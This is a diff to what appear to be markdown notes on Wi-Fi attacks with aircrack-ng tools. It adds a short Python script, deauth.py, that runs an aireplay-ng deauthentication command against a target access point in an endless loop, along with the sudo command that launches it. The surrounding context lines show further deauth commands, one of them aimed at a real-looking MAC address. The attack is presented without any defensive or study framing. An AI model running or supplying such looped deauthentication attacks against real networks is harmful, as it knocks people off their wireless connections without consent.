@@ -33,6 +33,22 @@ sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon
 # sudo aireplay-ng --deauth 100 -a 70:5D:CC:65:45:C2 wlan0mon
 ```
 
+### deauth.py
+```python
+import os, time
+
+while True:
+	os.system("aireplay-ng --deauth 10 -a 00:00:00:00:00:00 wlan0")
+	time.sleep(1)
+
+```
+
+```bash
+sudo python3 deauth.py
+```
+
+
+
 
 ### aireplay-ng error : (wlan0mon is on channel 2, but the AP uses channel 5)
 ```
